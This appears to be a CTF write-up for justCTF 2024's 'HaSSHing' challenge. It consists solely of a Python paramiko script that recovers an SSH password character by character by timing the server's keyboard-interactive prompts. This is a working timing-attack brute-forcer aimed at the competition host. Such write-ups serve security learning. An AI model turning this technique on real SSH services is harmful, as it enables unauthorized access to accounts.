---
title: "HaSSHing - justCTF 2024 teaser"
category: "misc"
type: "writeup"
tags: ["misc", "hasshing", "justctf-2024-teaser", "2024", "ctf-writeup"]
summary: "from string import digits"
source:
  name: "CTFtime writeup #39190"
  url: "https://ctftime.org/writeup/39190"
ctf:
  name: "justCTF 2024 teaser"
  year: 2024
  challenge: "HaSSHing"
---

## Metadata

- **CTF:** justCTF 2024 teaser
- **Task:** HaSSHing
- **Author team:** thehackerscrew
- **CTFtime:** <https://ctftime.org/writeup/39190>

---
```python  
from string import digits

import paramiko

CHARSET = "CFT_cdhjlnstuw{}" + digits

current_password = ""  
measurements = []

def handler(title, instructions, prompt_list):  
global current_password  
global measurements

if instructions.startswith("["):  
title_time = float(  
title[13:27].replace("-", "").replace(" ", "").replace(":", "")  
)  
instructions_time = float(  
instructions[13:27].replace("-", "").replace(" ", "").replace(":", "")  
)  
current_time = instructions_time - title_time

if current_time < 10:  
measurements.append((current_time, CHARSET[len(measurements)]))

if len(measurements) == len(CHARSET):  
measurements.sort()  
print(measurements)  
current_password += measurements[-1][1]  
print(current_password)

measurements = []

return (current_password + CHARSET[len(measurements)],)

while True:  
transport = paramiko.Transport(("[hasshing.nc.jctf.pro](http://hasshing.nc.jctf.pro)", 1337))  
transport.connect(username="ctf")  
try:  
transport.auth_interactive("ctf", handler)

print(current_password + CHARSET[len(measurements)])  
break  
except paramiko.ssh_exception.AuthenticationException:  
pass  
finally:  
transport.close()  
```
